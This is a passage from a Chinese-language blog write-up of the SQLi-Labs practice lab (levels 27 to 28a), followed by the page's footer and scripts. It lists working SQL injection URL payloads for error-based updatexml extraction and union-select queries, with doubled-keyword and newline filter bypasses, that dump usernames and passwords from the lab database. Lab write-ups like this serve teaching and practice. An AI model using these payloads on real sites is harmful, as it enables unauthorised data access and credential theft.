+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(column_name))from(information_schema.columns)where(table_schema=&#x27;security&#x27;and(table_name=&#x27;users&#x27;))),0x7e),1))or&#x27;0</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆敏感信息</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=1&#x27;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users)),0x7e),1))or&#x27;0</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="Less-27a"   >
+          <a href="#Less-27a" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h1>
+      
+        <h2 id="题解-7"   >
+          <a href="#题解-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-7" class="headerlink" title="题解"></a>题解</h2>
+      <p>与 Less-27 类似，但是不返回报错信息。</p>
+<p><strong>爆字段</strong></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=0&quot;uniunionon%0AseleSelectct%0A1,2,group_concat(column_name)from%0Ainformation_schema.columns%0Awhere%0Atable_schema=&#x27;security&#x27;%0Aand%0Atable_name=&#x27;users&#x27;%0Aand&quot;1</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆敏感信息</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=0&quot;uniunionon%0AseleSelectct%0A1,2,group_concat(username,&#x27;:&#x27;,password)from%0Asecurity.users%0Aand&quot;1</span><br><span class="line"># 爆所有信息似乎有问题，只能通过 id 遍历。</span><br><span class="line">url + ?id=0&quot;uniunionon%0AseleSelectct%0A1,2,group_concat(username,&#x27;:&#x27;,password)from%0Asecurity.users%0Awhere%0Aid=1%0Aand&quot;1</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="Less-28"   >
+          <a href="#Less-28" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1>
+      
+        <h2 id="题解-8"   >
+          <a href="#题解-8" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-8" class="headerlink" title="题解"></a>题解</h2>
+      <p>字符型【’)】。过滤替换了一次 <code>union select</code>。依旧双写绕过。</p>
+<p><strong>爆表</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=0&#x27;)uniunion%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=&#x27;security&#x27;and (&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆字段</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=0&#x27;)uniunion%0Aselecton%0Aselect%0A1,2,group_concat(column_name)from%0Ainformation_schema.columns%0Awhere%0Atable_schema=&#x27;security&#x27;%0Aand%0Atable_name=&#x27;users&#x27;%0Aand(&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>爆敏感数据</strong>：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url + ?id=0&#x27;)uniunion%0Aselecton%0Aselect%0A1,2,group_concat(username,&quot;:&quot;,password)from%0Ausers%0Awhere%0Aid=1%0Aand%0A(&#x27;1</span><br></pre></td></tr></table></div></figure>
+
+
+        <h1 id="Less-28a"   >
+          <a href="#Less-28a" class="heading-link"><i class="fas fa-link"></i></a><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1>
+      
+        <h2 id="题解-9"   >
+          <a href="#题解-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#题解-9" class="headerlink" title="题解"></a>题解</h2>
+      <p>字符型【’)】。只过滤替换了一次 <code>union select</code>，其他的没有过滤。</p>
+<p>那就直接和 Less-28 一样了。其他方法这里就不尝试了。</p>
+<hr>
+<p><font color="#EE2C2C">
+谦，美德也，过谦者怀诈。默，懿行也，过默者藏奸。
+</font></p>
+<p align="right"><font color="#EE2C2C">
+——《格言联璧》（清）金缨
+</font></p>
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://blog.lens-shrine.top">镜坛主</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="https://blog.lens-shrine.top/2023/10/19/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04.%20Less%2023~28a/">https://blog.lens-shrine.top/2023/10/19/WriteUp%EF%BC%9ASecurity-Lab/SQLi-Labs/04.%20Less%2023~28a/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/11/17/SkillSummary%EF%BC%9A%E7%9F%A5%E8%AF%86%E6%9D%82%E7%83%A9/%E6%9D%82%E5%AD%A6%E8%AE%B0%E5%BD%95/%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">《杂学记录》特殊符号</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/10/06/SkillSummary%EF%BC%9A%E7%9F%A5%E8%AF%86%E6%9D%82%E7%83%A9/%E6%9D%82%E5%AD%A6%E8%AE%B0%E5%BD%95/Hello%20My%20World/"><span class="paginator-prev__text">《杂学记录》Hello My World</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B4%A2%E5%BC%95"><span class="toc-text">
+          索引</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-23"><span class="toc-text">
+          Less-23</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-text">
+          题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-24"><span class="toc-text">
+          Less-24</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-1"><span class="toc-text">
+          题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">
+          总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-25"><span class="toc-text">
+          Less-25</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-2"><span class="toc-text">
+          题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-25a"><span class="toc-text">
+          Less-25a</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-3"><span class="toc-text">
+          题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-26"><span class="toc-text">
+          Less-26</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-4"><span class="toc-text">
+          题解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-text">
+          总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-26a"><span class="toc-text">
+          Less-26a</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-5"><span class="toc-text">
+          题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-27"><span class="toc-text">
+          Less-27</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-6"><span class="toc-text">
+          题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-27a"><span class="toc-text">
+          Less-27a</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-7"><span class="toc-text">
+          题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-28"><span class="toc-text">
+          Less-28</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-8"><span class="toc-text">
+          题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-28a"><span class="toc-text">
+          Less-28a</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-9"><span class="toc-text">
+          题解</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">46</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">20</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload",".header-banner"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
+  // 加载进度条的计时器
+  var loadingTimer = null;
+
+  // 重置页面 Y 方向上的滚动偏移量
+  document.addEventListener('pjax:send', function () {
+    $('.header-nav-menu').removeClass('show');
+    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
+      $('html').velocity('scroll', {
+        duration: 500,
+        offset: $('#header').height(),
+        easing: 'easeInOutCubic'
+      });
+    }
+
+    var loadingBarWidth = 20;
+    var MAX_LOADING_WIDTH = 95;
+
+    $('.loading-bar').addClass('loading');
+    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    clearInterval(loadingTimer);
+    loadingTimer = setInterval(function () {
+      loadingBarWidth += 3;
+      if (loadingBarWidth > MAX_LOADING_WIDTH) {
+        loadingBarWidth = MAX_LOADING_WIDTH;
+      }
+      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    }, 500);
+  }, false);
+
+  window.addEventListener('pjax:complete', function () {
+    clearInterval(loadingTimer);
+    $('.loading-bar__progress').css('width', '100%');
+    $('.loading-bar').removeClass('loading');
+    setTimeout(function () {
+      $('.loading-bar__progress').css('width', '0');
+    }, 400);
+    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
+      $(this).remove();
+    });
+    $('script[data-pjax], #pjax-reload script').each(function () {
+      $(this).parent().append($(this).remove());
+    });
+
+    if (Stun.utils.pjaxReloadBoot) {
+      Stun.utils.pjaxReloadBoot();
+    }
+    if (Stun.utils.pjaxReloadScroll) {
+      Stun.utils.pjaxReloadScroll();
+    }
+    if (Stun.utils.pjaxReloadSidebar) {
+      Stun.utils.pjaxReloadSidebar();
+    }
+    if (false) {
+      if (Stun.utils.pjaxReloadHeader) {
+        Stun.utils.pjaxReloadHeader();
+      }
+      if (Stun.utils.pjaxReloadScrollIcon) {
+        Stun.utils.pjaxReloadScrollIcon();
+      }
+      if (Stun.utils.pjaxReloadLocalSearch) {
+        Stun.utils.pjaxReloadLocalSearch();
+      }
+    }
+  }, false);
+}, false);</script><div id="pjax-reload"></div><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/web-effect-click.js?v=2.8.0"></script><script src="/js/web-effect-flower.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
